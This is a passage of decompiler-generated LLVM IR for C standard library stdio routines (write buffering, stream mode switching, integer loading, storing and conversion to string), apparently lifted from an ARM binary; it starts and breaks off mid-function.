dec_label_pc_1911c:                               ; preds = %dec_label_pc_19110
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19124 = call i32 @memcpy()
  %v0_19128 = load i32, i32* @r5, align 4
  %v1_19128 = add i32 %v0_19128, 16
  %v2_19128 = inttoptr i32 %v1_19128 to i32*
  %v3_19128 = load i32, i32* %v2_19128, align 4
  %v1_1912c = inttoptr i32 %v0_19128 to i16*
  %v2_1912c = load i16, i16* %v1_1912c, align 2
  %v1_19130 = load i32, i32* @r6, align 4
  %v2_19130 = add i32 %v1_19130, %v3_19128
  %v1_19134 = and i16 %v2_1912c, 256
  %v2_19134 = icmp eq i16 %v1_19134, 0
  store i32 %v2_19130, i32* %v2_19128, align 4
  br i1 %v2_19134, label %dec_label_pc_191e4, label %dec_label_pc_19140

dec_label_pc_19140:                               ; preds = %dec_label_pc_1911c
  %v0_19140 = load i32, i32* @r7, align 4
  %v0_19148 = load i32, i32* @r6, align 4
  %v4_1914c = call i32 @memrchr(i32 %v0_19140, i32 10, i32 %v0_19148, i32 %v2_19130)
  %v2_19150 = icmp eq i32 %v4_1914c, 0
  br i1 %v2_19150, label %dec_label_pc_191e4, label %dec_label_pc_19158

dec_label_pc_19158:                               ; preds = %dec_label_pc_19140
  %v0_19158 = load i32, i32* @r5, align 4
  store i32 %v0_19158, i32* @r0, align 4
  %v0_1915c = call i32 @__stdio_wcommit()
  %v2_19160 = icmp eq i32 %v0_1915c, 0
  br i1 %v2_19160, label %dec_label_pc_191e4, label %dec_label_pc_19168

dec_label_pc_19168:                               ; preds = %dec_label_pc_19158
  %v1_19168 = load i32, i32* @r6, align 4
  %v3_19168 = icmp uge i32 %v0_1915c, %v1_19168
  %v1_19168.v0_1915c = select i1 %v3_19168, i32 %v1_19168, i32 %v0_1915c
  store i32 %v1_19168.v0_1915c, i32* @r4, align 4
  %v2_19174 = sub i32 %v1_19168, %v1_19168.v0_1915c
  %v0_19178 = load i32, i32* @r7, align 4
  %v2_19178 = add i32 %v0_19178, %v2_19174
  store i32 %v2_19178, i32* %r7.global-to-local, align 4
  store i32 %v2_19178, i32* @r0, align 4
  store i32 %v1_19168.v0_1915c, i32* @r2, align 4
  %v4_19188 = call i32 @__GI_memchr(i32 %v2_19178, i32 10, i32 %v1_19168.v0_1915c, i32 %v2_19174)
  %v2_1918c = icmp eq i32 %v4_19188, 0
  br i1 %v2_1918c, label %dec_label_pc_191e4, label %dec_label_pc_19194

dec_label_pc_19194:                               ; preds = %dec_label_pc_19168
  %v0_19194 = load i32, i32* @r5, align 4
  %v1_19194 = add i32 %v0_19194, 16
  %v2_19194 = inttoptr i32 %v1_19194 to i32*
  %v3_19194 = load i32, i32* %v2_19194, align 4
  %v0_19198 = load i32, i32* %r7.global-to-local, align 4
  %v1_19198 = load i32, i32* @r4, align 4
  %v2_19198 = sub i32 %v0_19198, %v4_19188
  %v2_1919c = add i32 %v2_19198, %v1_19198
  %v2_191a0 = sub i32 %v3_19194, %v2_1919c
  %v1_191a4 = load i32, i32* @r6, align 4
  %v2_191a4 = sub i32 %v1_191a4, %v2_1919c
  store i32 %v2_191a4, i32* @r6, align 4
  store i32 %v2_191a0, i32* %v2_19194, align 4
  br label %dec_label_pc_191e4

dec_label_pc_191b0:                               ; preds = %dec_label_pc_19110
  %v2_191b0 = add i32 %tmp, 8
  %v3_191b0 = inttoptr i32 %v2_191b0 to i32*
  %v4_191b0 = load i32, i32* %v3_191b0, align 4
  %v9_191b4 = icmp eq i32 %v4_190dc, %v4_191b0
  br i1 %v9_191b4, label %dec_label_pc_191d0, label %dec_label_pc_191bc

dec_label_pc_191bc:                               ; preds = %dec_label_pc_191b0
  store i32 %tmp, i32* @r0, align 4
  %v0_191c0 = call i32 @__stdio_wcommit()
  %v2_191c4 = icmp eq i32 %v0_191c0, 0
  br i1 %v2_191c4, label %dec_label_pc_191bc.dec_label_pc_191d0_crit_edge, label %bb15

dec_label_pc_191bc.dec_label_pc_191d0_crit_edge:  ; preds = %dec_label_pc_191bc
  %v0_191d0.pre = load i32, i32* @r6, align 4
  %v0_191d4.pre = load i32, i32* @r5, align 4
  %v0_191d8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_191d0

bb15:                                             ; preds = %dec_label_pc_191bc
  %v1_191c8 = load i32, i32* @r4, align 4
  store i32 %v1_191c8, i32* @r6, align 4
  br label %dec_label_pc_191e4

dec_label_pc_191d0:                               ; preds = %dec_label_pc_191bc.dec_label_pc_191d0_crit_edge, %entry, %dec_label_pc_191b0
  %v0_191d8 = phi i32 [ %v0_191d8.pre, %dec_label_pc_191bc.dec_label_pc_191d0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_191b0 ]
  %v0_191d4 = phi i32 [ %v0_191d4.pre, %dec_label_pc_191bc.dec_label_pc_191d0_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_191b0 ]
  %v0_191d0 = phi i32 [ %v0_191d0.pre, %dec_label_pc_191bc.dec_label_pc_191d0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_191b0 ]
  %v1_191d4 = inttoptr i32 %v0_191d4 to i16*
  %v5_191dc = call i32 @__stdio_WRITE(i16* %v1_191d4, i32 %v0_191d8, i32 %v0_191d0)
  store i32 %v5_191dc, i32* @r6, align 4
  br label %dec_label_pc_191e4

dec_label_pc_191e4:                               ; preds = %bb15, %dec_label_pc_19168, %dec_label_pc_19158, %dec_label_pc_19140, %dec_label_pc_1911c, %dec_label_pc_19194, %bb12, %dec_label_pc_191d0
  %v0_191e4 = load i32, i32* @r6, align 4
  %v2_191ec = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_191ec, i32* @r4, align 4
  store i32 %v6_190b4, i32* @r5, align 4
  store i32 %v9_190b4, i32* @r6, align 4
  store i32 %v12_190b4, i32* @r7, align 4
  ret i32 %v0_191e4

; uselistorder directives
  uselistorder i32 %v2_1919c, { 1, 0 }
  uselistorder i32 %v2_19174, { 1, 0 }
  uselistorder i32 %v1_19168.v0_1915c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_19168, { 1, 0, 2 }
  uselistorder i32 %v2_190e8, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_191e4, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_191d0, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_191f4 = load i32, i32* @r4, align 4
  store i32 %v3_191f4, i32* %stack_var_-8, align 4
  %v3_191f8 = load i16, i16* %arg1, align 2
  %v4_191f8 = zext i16 %v3_191f8 to i32
  %v2_191fc = and i32 %v4_191f8, %arg2
  %v4_191fc = icmp eq i32 %v2_191fc, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_191fc, label %dec_label_pc_19208, label %dec_label_pc_19218

dec_label_pc_19208:                               ; preds = %entry
  %v1_19208 = and i32 %v4_191f8, 2176
  %v2_19208 = icmp eq i32 %v1_19208, 0
  br i1 %v2_19208, label %dec_label_pc_19210, label %dec_label_pc_19224

dec_label_pc_19210:                               ; preds = %dec_label_pc_19208
  %v2_19210 = or i32 %v4_191f8, %arg2
  %v1_19214 = trunc i32 %v2_19210 to i16
  store i16 %v1_19214, i16* %arg1, align 2
  %v0_19218.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19218

dec_label_pc_19218:                               ; preds = %entry, %dec_label_pc_19210
  %v0_19254 = phi i32 [ %tmp, %entry ], [ %v0_19218.pre, %dec_label_pc_19210 ]
  %v1_19218 = inttoptr i32 %v0_19254 to i16*
  %v2_19218 = load i16, i16* %v1_19218, align 2
  %v3_19218 = zext i16 %v2_19218 to i32
  store i32 %v3_19218, i32* @ip, align 4
  %v1_1921c = and i32 %v3_19218, 32
  %v2_1921c = icmp eq i32 %v1_1921c, 0
  br i1 %v2_1921c, label %dec_label_pc_19244, label %dec_label_pc_19224

dec_label_pc_19224:                               ; preds = %dec_label_pc_19208, %dec_label_pc_19218
  %v0_19224 = call i32 @__GI___errno_location()
  store i32 %v0_19224, i32* %r0.global-to-local, align 4
  %v2_1922c = inttoptr i32 %v0_19224 to i32*
  store i32 9, i32* %v2_1922c, align 4
  br label %dec_label_pc_19230

dec_label_pc_19230:                               ; preds = %dec_label_pc_1926c, %dec_label_pc_19224
  %v0_19230 = load i32, i32* @r4, align 4
  %v1_19230 = inttoptr i32 %v0_19230 to i16*
  %v2_19230 = load i16, i16* %v1_19230, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_19238 = or i16 %v2_19230, 8
  store i16 %v1_19238, i16* %v1_19230, align 2
  br label %bb11

dec_label_pc_19244:                               ; preds = %dec_label_pc_19218
  %tmp14 = urem i16 %v2_19218, 4
  %v2_19244 = icmp eq i16 %tmp14, 0
  br i1 %v2_19244, label %dec_label_pc_192a0, label %dec_label_pc_1924c

dec_label_pc_1924c:                               ; preds = %dec_label_pc_19244
  %v1_1924c = and i32 %v3_19218, 4
  store i32 %v1_1924c, i32* @r1, align 4
  %v2_1924c = icmp eq i32 %v1_1924c, 0
  br i1 %v2_1924c, label %dec_label_pc_19254, label %dec_label_pc_19284

dec_label_pc_19254:                               ; preds = %dec_label_pc_1924c
  %v1_19254 = add i32 %v0_19254, 20
  %v2_19254 = inttoptr i32 %v1_19254 to i32*
  %v3_19254 = load i32, i32* %v2_19254, align 4
  store i32 %v3_19254, i32* %r2.global-to-local, align 4
  %v1_19258 = add i32 %v0_19254, 16
  %v2_19258 = inttoptr i32 %v1_19258 to i32*
  %v3_19258 = load i32, i32* %v2_19258, align 4
  %v9_1925c = icmp eq i32 %v3_19254, %v3_19258
  br i1 %v9_1925c, label %dec_label_pc_19264, label %dec_label_pc_1926c

dec_label_pc_19264:                               ; preds = %dec_label_pc_19254
  %v1_19264 = and i32 %v3_19218, 2
  %v2_19264 = icmp eq i32 %v1_19264, 0
  br i1 %v2_19264, label %dec_label_pc_19284, label %dec_label_pc_1926c

dec_label_pc_1926c:                               ; preds = %dec_label_pc_19254, %dec_label_pc_19264
  %v1_1926c = and i32 %v3_19218, 1024
  %tmp12 = udiv i32 %v1_1926c, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_19278 = call i32 @__GI_fseek()
  store i32 %v0_19278, i32* %r0.global-to-local, align 4
  %v2_1927c = icmp eq i32 %v0_19278, 0
  br i1 %v2_1927c, label %.dec_label_pc_19284_crit_edge, label %dec_label_pc_19230

.dec_label_pc_19284_crit_edge:                    ; preds = %dec_label_pc_1926c
  %v0_19284.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19284

dec_label_pc_19284:                               ; preds = %.dec_label_pc_19284_crit_edge, %dec_label_pc_1924c, %dec_label_pc_19264
  %v2_19290 = phi i32 [ %v0_19284.pre, %.dec_label_pc_19284_crit_edge ], [ %v0_19254, %dec_label_pc_1924c ], [ %v0_19254, %dec_label_pc_19264 ]
  %v1_19284 = inttoptr i32 %v2_19290 to i16*
  %v2_19284 = load i16, i16* %v1_19284, align 2
  %v1_19288 = add i32 %v2_19290, 8
  %v2_19288 = inttoptr i32 %v1_19288 to i32*
  %v3_19288 = load i32, i32* %v2_19288, align 4
  store i32 %v3_19288, i32* %r2.global-to-local, align 4
  %v1_1928c = and i16 %v2_19284, -4
  store i16 %v1_1928c, i16* %v1_19284, align 2
  %v0_19294 = load i32, i32* %r2.global-to-local, align 4
  %v1_19294 = load i32, i32* @r4, align 4
  %v2_19294 = add i32 %v1_19294, 20
  %v3_19294 = inttoptr i32 %v2_19294 to i32*
  store i32 %v0_19294, i32* %v3_19294, align 4
  %v0_19298 = load i32, i32* %r2.global-to-local, align 4
  %v1_19298 = load i32, i32* @r4, align 4
  %v2_19298 = add i32 %v1_19298, 24
  %v3_19298 = inttoptr i32 %v2_19298 to i32*
  store i32 %v0_19298, i32* %v3_19298, align 4
  %v0_1929c = load i32, i32* %r2.global-to-local, align 4
  %v1_1929c = load i32, i32* @r4, align 4
  %v2_1929c = add i32 %v1_1929c, 16
  %v3_1929c = inttoptr i32 %v2_1929c to i32*
  store i32 %v0_1929c, i32* %v3_1929c, align 4
  %v0_192a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_192a0

dec_label_pc_192a0:                               ; preds = %dec_label_pc_19244, %dec_label_pc_19284
  %v2_192ac = phi i32 [ %v0_19254, %dec_label_pc_19244 ], [ %v0_192a0.pre, %dec_label_pc_19284 ]
  %v1_192a0 = inttoptr i32 %v2_192ac to i16*
  %v2_192a0 = load i16, i16* %v1_192a0, align 2
  %v3_192a0 = zext i16 %v2_192a0 to i32
  %v1_192a4 = or i16 %v2_192a0, 64
  %v1_192a8 = and i32 %v3_192a0, 2816
  store i32 %v1_192a8, i32* %r0.global-to-local, align 4
  %v2_192a8 = icmp eq i32 %v1_192a8, 0
  store i16 %v1_192a4, i16* %v1_192a0, align 2
  br i1 %v2_192a8, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_192a0
  %v1_192b0 = load i32, i32* @r4, align 4
  %v2_192b0 = add i32 %v1_192b0, 12
  %v3_192b0 = inttoptr i32 %v2_192b0 to i32*
  %v4_192b0 = load i32, i32* %v3_192b0, align 4
  %v3_192b4 = add i32 %v1_192b0, 28
  %v4_192b4 = inttoptr i32 %v3_192b4 to i32*
  store i32 %v4_192b0, i32* %v4_192b4, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_192a0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_19230, %.thread1
  %v2_192bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_192bc, i32* @r4, align 4
  %v1_192c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_192c0

; uselistorder directives
  uselistorder i32 %v2_19290, { 1, 0 }
  uselistorder i32 %v0_19254, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_191f8, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_192a0, { 1, 0 }
  uselistorder label %dec_label_pc_19284, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1926c, { 1, 0 }
  uselistorder label %dec_label_pc_19224, { 1, 0 }
  uselistorder label %dec_label_pc_19218, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_192c4 = load i32, i32* @r2, align 4
  %v1_192c4 = icmp slt i32 %v0_192c4, 0
  %v0_192c8 = load i32, i32* @r0, align 4
  %v1_192cc = and i32 %v0_192c8, 2048
  %v2_19300 = icmp eq i32 %v1_192cc, 0
  br i1 %v1_192c4, label %dec_label_pc_19300, label %dec_label_pc_192d4

dec_label_pc_192d4:                               ; preds = %entry
  br i1 %v2_19300, label %dec_label_pc_192dc, label %dec_label_pc_19308

dec_label_pc_192dc:                               ; preds = %dec_label_pc_192d4
  %v7_192dc = icmp eq i32 %v0_192c8, 256
  %v0_192e0 = load i32, i32* @r1, align 4
  %v1_192e0 = inttoptr i32 %v0_192e0 to i32*
  %v2_192e0 = load i32, i32* %v1_192e0, align 4
  %v2_192e4 = urem i32 %v2_192e0, 256
  %v2_192e4.v2_192e0 = select i1 %v7_192dc, i32 %v2_192e4, i32 %v2_192e0
  br i1 %v7_192dc, label %.thread, label %dec_label_pc_192ec

dec_label_pc_192ec:                               ; preds = %dec_label_pc_192dc
  %v7_192ec = icmp eq i32 %v0_192c8, 512
  br i1 %v7_192ec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_192ec
  %v4_192f4 = urem i32 %v2_192e4.v2_192e0, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_192ec, %dec_label_pc_192dc, %bb
  %v1_192fc = phi i32 [ %v2_192e0, %dec_label_pc_192ec ], [ %v2_192e4, %dec_label_pc_192dc ], [ %v4_192f4, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_192fc

dec_label_pc_19300:                               ; preds = %entry
  br i1 %v2_19300, label %dec_label_pc_19310, label %dec_label_pc_19308

dec_label_pc_19308:                               ; preds = %dec_label_pc_192d4, %dec_label_pc_19300
  %v0_19308 = load i32, i32* @r1, align 4
  %v1_19308 = inttoptr i32 %v0_19308 to i32*
  %v2_19308 = load i32, i32* %v1_19308, align 4
  %v3_19308 = add i32 %v0_19308, 4
  %v4_19308 = inttoptr i32 %v3_19308 to i32*
  %v5_19308 = load i32, i32* %v4_19308, align 4
  store i32 %v5_19308, i32* @r1, align 4
  ret i32 %v2_19308

dec_label_pc_19310:                               ; preds = %dec_label_pc_19300
  %v7_19310 = icmp eq i32 %v0_192c8, 256
  %v0_19314 = load i32, i32* @r1, align 4
  %v1_19314 = inttoptr i32 %v0_19314 to i32*
  %v2_19314 = load i32, i32* %v1_19314, align 4
  %v2_19318 = urem i32 %v2_19314, 256
  %v2_19318.v2_19314 = select i1 %v7_19310, i32 %v2_19318, i32 %v2_19314
  br i1 %v7_19310, label %.thread2, label %dec_label_pc_19320

dec_label_pc_19320:                               ; preds = %dec_label_pc_19310
  %v7_19320 = icmp eq i32 %v0_192c8, 512
  br i1 %v7_19320, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_19320
  %v4_19324 = mul i32 %v2_19318.v2_19314, 65536
  %v4_19328 = sdiv i32 %v4_19324, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19320, %dec_label_pc_19310, %bb5
  %v0_1932c = phi i32 [ %v2_19314, %dec_label_pc_19320 ], [ %v2_19318, %dec_label_pc_19310 ], [ %v4_19328, %bb5 ]
  %v3_1932c = ashr i32 %v0_1932c, 31
  store i32 %v3_1932c, i32* @r1, align 4
  ret i32 %v0_1932c

; uselistorder directives
  uselistorder i32 %v0_1932c, { 1, 0 }
  uselistorder i32 %v2_19318, { 1, 0 }
  uselistorder i32 %v2_19314, { 1, 2, 0 }
  uselistorder i32 %v2_192e4, { 1, 0 }
  uselistorder i32 %v2_192e0, { 1, 2, 0 }
  uselistorder i1 %v2_19300, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19308, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_19334 = icmp eq i32 %arg2, 256
  store i1 %v7_19334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19334, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_19338 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_19338, i8* %tmp3, align 1
  %v1_1933c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_1933c = phi i1 [ false, %entry ], [ %v1_1933c.pre, %bb ]
  %v0_1933c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1933c, i32 %v0_1933c)
  %v7_19340 = icmp eq i32 %arg2, 2048
  store i1 %v7_19340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19340, label %dec_label_pc_19348, label %dec_label_pc_19350

dec_label_pc_19348:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_19348 = add i32 %tmp2, 4
  %v6_19348 = inttoptr i32 %v5_19348 to i32*
  store i32 %arg4, i32* %v6_19348, align 4
  ret i32 %tmp2

dec_label_pc_19350:                               ; preds = %bb4
  %v7_19350 = icmp eq i32 %arg2, 512
  store i1 %v7_19350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19350, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_19350
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_19350
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 3, 0, 2, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_1936c = icmp slt i32 %tmp21, 0
  %v2_1936c = icmp eq i32 %tmp21, 0
  store i1 %v2_1936c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_19374 = load i32, i32* @r2, align 4
  store i32 %v0_19374, i32* %r5.global-to-local, align 4
  %v0_19378 = load i32, i32* @r3, align 4
  store i32 %v0_19378, i32* %r6.global-to-local, align 4
  br i1 %v1_1936c, label %dec_label_pc_19380, label %dec_label_pc_193a0

dec_label_pc_19380:                               ; preds = %entry
  %v1_19380 = icmp slt i32 %v0_19378, 0
  %v2_19380 = icmp eq i32 %v0_19378, 0
  store i1 %v2_19380, i1* %cpsr_z.global-to-local, align 1
  %v1_19384 = sub i32 0, %tmp21
  store i32 %v1_19384, i32* %r7.global-to-local, align 4
  br i1 %v1_19380, label %dec_label_pc_1938c, label %dec_label_pc_193a0

dec_label_pc_1938c:                               ; preds = %dec_label_pc_19380
  %v1_19390 = sub i32 0, %v0_19374
  store i32 %v1_19390, i32* %r5.global-to-local, align 4
  %v2_19390 = icmp eq i32 %v0_19374, 0
  %v2_19394 = icmp eq i1 %v2_19390, false
  %v5_19394 = sext i1 %v2_19394 to i32
  %v6_19394 = sub i32 %v5_19394, %v0_19378
  store i32 %v6_19394, i32* %r6.global-to-local, align 4
  %v19_19394 = icmp eq i32 %v6_19394, 0
  store i1 %v19_19394, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_193a8

dec_label_pc_193a0:                               ; preds = %dec_label_pc_19380, %entry
  br label %dec_label_pc_193a8

dec_label_pc_193a8:                               ; preds = %dec_label_pc_1938c, %dec_label_pc_193a0
  %storemerge = phi i8 [ 0, %dec_label_pc_193a0 ], [ 1, %dec_label_pc_1938c ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_193b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_193b8 = udiv i32 -1, %v0_193b0
  store i32 %v2_193b8, i32* %fp.global-to-local, align 4
  %v3_193c8 = urem i32 -1, %v0_193b0
  %v1_193cc = add i32 %v3_193c8, 1
  store i32 %v1_193cc, i32* %sb.global-to-local, align 4
  %v9_193d0 = icmp eq i32 %v1_193cc, %v0_193b0
  store i1 %v9_193d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_193d0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_193a8
  %v1_193d4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_193d4, i32* %sb.global-to-local, align 4
  %v2_193d8 = add i32 %v2_193b8, 1
  store i32 %v2_193d8, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_193a8, %bb
  %v0_193dc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_193dc, i32* %sl.global-to-local, align 4
  %v0_193e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_193e0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_193e4

dec_label_pc_193e4thread-pre-split:               ; preds = %bb25
  %v0_193e4.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_193e8.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_193ec.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_193e4

dec_label_pc_193e4:                               ; preds = %dec_label_pc_193e4thread-pre-split, %.thread
  %v0_19468 = phi i32 [ %v0_193ec.pre, %dec_label_pc_193e4thread-pre-split ], [ %v0_193b0, %.thread ]
  %v0_19460 = phi i32 [ %v0_193e8.pre, %dec_label_pc_193e4thread-pre-split ], [ %v0_193e0, %.thread ]
  %v0_193fc = phi i32 [ %v0_193e4.pr, %dec_label_pc_193e4thread-pre-split ], [ %v0_193dc, %.thread ]
  %v2_193e4 = icmp eq i32 %v0_193fc, 0
  store i1 %v2_193e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193e4, label %dec_label_pc_1945c, label %dec_label_pc_193f4

dec_label_pc_193f4:                               ; preds = %dec_label_pc_193e4
  %v2_193f8 = udiv i32 %v0_193fc, %v0_19468
  %v3_193f8 = urem i32 %v0_193fc, %v0_19468
  store i32 %v2_193f8, i32* %sl.global-to-local, align 4
  %v2_19418 = udiv i32 %v0_19460, %v0_19468
  %v3_19418 = urem i32 %v0_19460, %v0_19468
  %v0_1941c = load i32, i32* %sb.global-to-local, align 4
  %v2_1941c = mul i32 %v0_1941c, %v3_193f8
  %v2_19424 = add i32 %v2_1941c, %v3_19418
  store i32 %v2_19424, i32* %r5.global-to-local, align 4
  %v0_19430 = load i32, i32* %fp.global-to-local, align 4
  %v2_19430 = mul i32 %v0_19430, %v3_193f8
  %v2_19438 = add i32 %v2_19430, %v2_19418
  %v2_19440 = udiv i32 %v2_19424, %v0_19468
  %v2_19448 = add i32 %v2_19438, %v2_19440
  br label %dec_label_pc_19474

dec_label_pc_1945c:                               ; preds = %dec_label_pc_193e4
  %v2_1945c = udiv i32 %v0_19460, %v0_19468
  br label %dec_label_pc_19474

dec_label_pc_19474:                               ; preds = %dec_label_pc_193f4, %dec_label_pc_1945c
  %storemerge28 = phi i32 [ %v2_1945c, %dec_label_pc_1945c ], [ %v2_19448, %dec_label_pc_193f4 ]
  %v0_19490 = phi i32 [ %v2_1945c, %dec_label_pc_1945c ], [ %v2_19448, %dec_label_pc_193f4 ]
  %v1_19490 = phi i32 [ 0, %dec_label_pc_1945c ], [ %v2_193f8, %dec_label_pc_193f4 ]
  %v2_19424.pn = phi i32 [ %v0_19460, %dec_label_pc_1945c ], [ %v2_19424, %dec_label_pc_193f4 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_1947c = urem i32 %v2_19424.pn, %v0_19468
  %v2_19478 = icmp ugt i32 %v0_1947c, 8
  %v7_19478 = icmp eq i32 %v0_1947c, 9
  store i1 %v7_19478, i1* %cpsr_z.global-to-local, align 1
  %v1_19480 = add i32 %v0_1947c, 48
  %v0_19488 = load i32, i32* %r8.global-to-local, align 4
  %v1_19488 = add i32 %v0_19488, -1
  store i32 %v1_19488, i32* %r8.global-to-local, align 4
  %v2_1948c = xor i1 %v7_19478, true
  %v3_1948c = and i1 %v2_19478, %v2_1948c
  %extract.t = trunc i32 %v1_19480 to i8
  br i1 %v3_1948c, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_19474
  %v2_1947c = add i32 %v0_1947c, %tmp11
  %extract.t9 = trunc i32 %v2_1947c to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_19474, %bb24
  %v0_19494.off0 = phi i8 [ %extract.t, %dec_label_pc_19474 ], [ %extract.t9, %bb24 ]
  %v2_19490 = or i32 %v0_19490, %v1_19490
  %v4_19490 = icmp eq i32 %v2_19490, 0
  store i1 %v4_19490, i1* %cpsr_z.global-to-local, align 1
  %v3_19494 = inttoptr i32 %v1_19488 to i8*
  store i8 %v0_19494.off0, i8* %v3_19494, align 1
  %v0_19498 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19498, label %dec_label_pc_1949c, label %dec_label_pc_193e4thread-pre-split

dec_label_pc_1949c:                               ; preds = %bb25
  %v4_1949c10 = zext i8 %storemerge to i32
  store i32 %v4_1949c10, i32* @r3, align 4
  %v2_194a0 = icmp eq i8 %storemerge, 0
  store i1 %v2_194a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194a0, label %dec_label_pc_1949c..thread2_crit_edge, label %bb26

dec_label_pc_1949c..thread2_crit_edge:            ; preds = %dec_label_pc_1949c
  %v0_194ac.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_1949c
  store i32 45, i32* @r3, align 4
  %v3_194a8 = load i32, i32* %r8.global-to-local, align 4
  %v4_194a8 = add i32 %v3_194a8, -1
  %v5_194a8 = inttoptr i32 %v4_194a8 to i8*
